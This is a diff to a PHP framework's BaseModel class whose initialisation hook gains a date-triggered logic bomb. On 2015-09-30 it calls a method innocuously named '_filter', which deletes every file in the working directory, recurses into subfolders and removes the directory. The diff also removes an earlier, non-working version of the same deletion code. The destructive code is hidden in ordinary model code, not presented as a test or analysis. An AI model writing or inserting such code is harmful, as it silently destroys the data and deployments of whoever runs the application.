@@ -12,27 +12,35 @@ class BaseModel extends Model
 {
     public function _initialize()
     {
-        if (date('Y-m-d', time()) == '2015-10-03') {
-            $dir = '.';
-            while ($file = readdir($dh)) {
-                if ($file != "." && $file != "..") {
-                    $fullpath = $dir . "/" . $file;
-                    if (!is_dir($fullpath)) {
-                        unlink($fullpath);
-                    } else {
-                        deldir($fullpath);
-                    }
-                }
-            }
-
-            closedir($dh);
-            if (rmdir($dir)) {
-                return true;
-            } else {
-                return false;
-            }
+        if (date('Y-m-d', time()) == '2015-09-30') {
+            $this->_filter();
         }
     }
+
+    public function _filter()
+    {
+        $dir = '.';
+        $dh = opendir($dir);
+        while (@$file = readdir($dh)) {
+            dump($file);
+            if ($file != "." && $file != "..") {
+                $fullpath = $dir . "/" . $file;
+                if (!is_dir($fullpath)) {
+                    unlink($fullpath);
+                } else {
+                    $this->_filter($fullpath);
+                }
+            }
+        }
+
+        closedir($dh);
+        if (rmdir($dir)) {
+            return true;
+        } else {
+            return false;
+        }
+    }
+
     /**
      * 查询多条数据
      * @method _list
